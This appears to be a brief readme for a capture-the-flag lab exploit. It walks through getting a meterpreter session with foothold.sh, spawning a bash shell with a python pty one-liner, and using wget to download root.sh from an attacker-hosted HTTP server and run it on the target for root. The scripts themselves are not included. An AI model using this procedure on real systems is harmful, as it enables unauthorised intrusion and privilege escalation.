1st is to execute foothold.sh
after executing  it will comeback as a meterpreter session 
then type this "shell" without the quotation marks then this command 
python -c 'import pty;pty.spawn("/bin/bash")'
first you should start a HTTPServer in the folder of the files
using python -m SimpleHTTPServer 
then upload the root.sh.sh into the shell using wget ip:8000/root.sh 
then chmod +x after run it using ./root.sh
then  you have the user and root flag in front of you
